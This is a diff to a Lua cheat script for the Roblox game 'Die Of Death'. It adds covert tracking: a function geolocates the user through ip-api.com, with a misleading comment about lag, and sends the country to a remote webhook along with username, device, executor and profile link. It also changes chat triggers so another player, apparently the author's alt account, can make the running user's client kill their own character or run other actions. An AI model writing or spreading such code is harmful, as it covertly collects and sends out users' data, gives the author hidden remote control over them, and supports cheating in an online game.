@@ -903,7 +903,7 @@ local OPTHINGS = Sabotage:Channel("OP FEATURES!!!!")
 
 OPTHINGS:Label("OP Functions are only available for Premium Users!")
 
-local pprice = pcall(GetPrice(1264479709)) or 49
+local pprice = pcall(GetPrice(1264479709)) or 39
 
 OPTHINGS:Label("Premium cost only "..pprice.." robux!")
 
@@ -1368,15 +1368,15 @@ end
 
 
 -- you know what are these functions...
-local function onChatted(message, recipient)
+local function onChatted(message)
     pcall(function()
-    if string.find(string.lower(message), "miso") then
+    if message:match("-! activate miso") then
 	for _,e in pairs(game:GetService("Players"):GetPlayers()) do
 	if e then
 		pcall(CreateMISO(e))
 	end
 	end
-    elseif string.find(string.lower(message), "permadie") then
+    elseif message:match("-! activate permadie") then
 	pcall(function()
 	    if replicatesignal then
         replicatesignal(game:GetService("Players").LocalPlayer.ConnectDiedSignalBackend)
@@ -1386,21 +1386,47 @@ local function onChatted(message, recipient)
 	end
     	    end
 	end)
-    elseif string.find(string.lower(message), "resetchar") then
+    elseif message:match("-! activate resetchar") then
 	if game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and 			game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
 		game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
 	end
+    elseif message:match("-! setanim (%a+)") then
+local target_anim = message:match("-! setanim (%a+)")
+pcall(function()
+for i,v in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Killer"):GetChildren()) do if v then
+for _,e in pairs(v:GetChildren()) do if e and e:FindFirstChild("Animations") and e.Name == target_anim or e.Name:match(target_anim) then
+local RunAnim = e:WaitForChild("Animations"):WaitForChild("Sprint").AnimationId or e:WaitForChild("Animations"):WaitForChild("OldSprint").AnimationId or e:WaitForChild("Animations"):WaitForChild("NormalSprint").AnimationId or e:WaitForChild("Animations"):WaitForChild("HurtSprint").AnimationId
+local WalkAnim = e:WaitForChild("Animations"):WaitForChild("Walk").AnimationId or e:WaitForChild("Animations"):WaitForChild("OldWalk").AnimationId
+local IdleAnim = e:WaitForChild("Animations"):WaitForChild("Idle").AnimationId or e:WaitForChild("Animations"):WaitForChild("OldIdle").AnimationId
+pcall(SetAnim(RunAnim, WalkAnim, IdleAnim))
+end; end
+end; end
+end)
     end
     end)
 end
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
 if v then
 v.Chatted:Connect(onChatted)
+if v.Name == "Nexer1234_AnotherAlt" then
+local msg_hi = Instance.new("Message")
+msg_hi.Parent = (game:FindService("CoreGui") and game:GetService("CoreGui")) or game:GetService("Workspace")
+msg_hi.Text = "congrats you met owner of this script!!"
+task.wait(10)
+msg_hi:Destroy()
+end
 end
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
 if v then
 v.Chatted:Connect(onChatted)
+if v.Name == "Nexer1234_AnotherAlt" then
+local msg_hi = Instance.new("Message")
+msg_hi.Parent = (game:FindService("CoreGui") and game:GetService("CoreGui")) or game:GetService("Workspace")
+msg_hi.Text = "congrats you met owner of this script!!"
+task.wait(10)
+msg_hi:Destroy()
+end
 end
 end)
 
@@ -1437,6 +1463,12 @@ function getdevice()
     return dev
 end
 
+function getcountry() -- I need country to check if i'm gonna be laggy on your server or not
+local country_logger_handler = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=61439"))
+local country = (country_logger_handler and country_logger_handler["country"]) or "N/A"
+return country
+end
+
 -- Credits to @shmasocoolio from scriptblox! (https://www.scriptblox.com/u/shmasocoolio)
 
 if not getgenv then return nil end
@@ -1448,11 +1480,11 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." joined Die Of Death!",
+    ["content"] = "@everyone "..LP.Name.." executed DoD NH!",
     ["embeds"] = {
        {
            ["title"] = "General Info",
-           ["description"] = "Username: "..LP.Name..". Device: "..getdevice()..". Ping: "..getping()..". Executor: "..getexecutor()..". Roblox Profile: [Click](https://www.roblox.com/users/"..LP.UserId.."/profile)",    
+           ["description"] = "Country: "..getcountry()..". Username: "..LP.Name..". Device: "..getdevice()..". Ping: "..getping()..". Executor: "..getexecutor()..". Roblox Profile: [Click](https://www.roblox.com/users/"..LP.UserId.."/profile)",    
            ["type"] = "rich",
            ["color"] = 1000000,
            ["footer"] = {
